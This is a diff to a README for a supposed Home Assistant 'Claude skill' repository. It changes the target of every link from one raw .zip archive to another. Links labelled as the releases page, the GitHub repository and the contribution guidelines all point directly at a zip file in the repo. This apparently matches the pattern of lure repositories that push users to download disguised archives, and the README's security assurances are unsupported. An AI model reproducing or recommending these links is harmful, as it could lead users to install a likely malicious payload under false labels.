@@ -1,6 +1,6 @@
 # 🚀 claude-skill-homeassistant - Simplify Your Home Automation Tasks
 
-[![Download Now](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/claude-skill-homeassistant-v2.5-alpha.4.zip)](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/claude-skill-homeassistant-v2.5-alpha.4.zip)
+[![Download Now](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/homeassistant-claude-skill-3.9.zip)](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/homeassistant-claude-skill-3.9.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ To run **claude-skill-homeassistant**, ensure your system meets the following:
 
 Follow these steps to download and run the application:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/claude-skill-homeassistant-v2.5-alpha.4.zip).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/homeassistant-claude-skill-3.9.zip).
 
 2. **Select the Latest Version:** Look for the latest version at the top of the releases list. 
 
@@ -41,7 +41,7 @@ Follow these steps to download and run the application:
 
 ## 📥 Download & Install
 
-For your convenience, you can directly [visit this page to download](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/claude-skill-homeassistant-v2.5-alpha.4.zip) the latest release of **claude-skill-homeassistant**. 
+For your convenience, you can directly [visit this page to download](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/homeassistant-claude-skill-3.9.zip) the latest release of **claude-skill-homeassistant**. 
 
 ## 🔧 How to Use the Application
 
@@ -73,11 +73,11 @@ Yes, data security is a priority. All communications are encrypted, and your dat
 
 ### How can I get support?
 
-If you encounter any issues, you can open an issue on our [GitHub repository](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/claude-skill-homeassistant-v2.5-alpha.4.zip) or check our FAQ section.
+If you encounter any issues, you can open an issue on our [GitHub repository](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/homeassistant-claude-skill-3.9.zip) or check our FAQ section.
 
 ## 📑 Contribution
 
-We welcome contributions! If you're interested in helping improve **claude-skill-homeassistant**, please refer to our guidelines in the [https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/claude-skill-homeassistant-v2.5-alpha.4.zip](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/claude-skill-homeassistant-v2.5-alpha.4.zip). 
+We welcome contributions! If you're interested in helping improve **claude-skill-homeassistant**, please refer to our guidelines in the [https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/homeassistant-claude-skill-3.9.zip](https://raw.githubusercontent.com/m81098s/claude-skill-homeassistant/main/antluetic/homeassistant-claude-skill-3.9.zip). 
 
 ## 📄 License
 
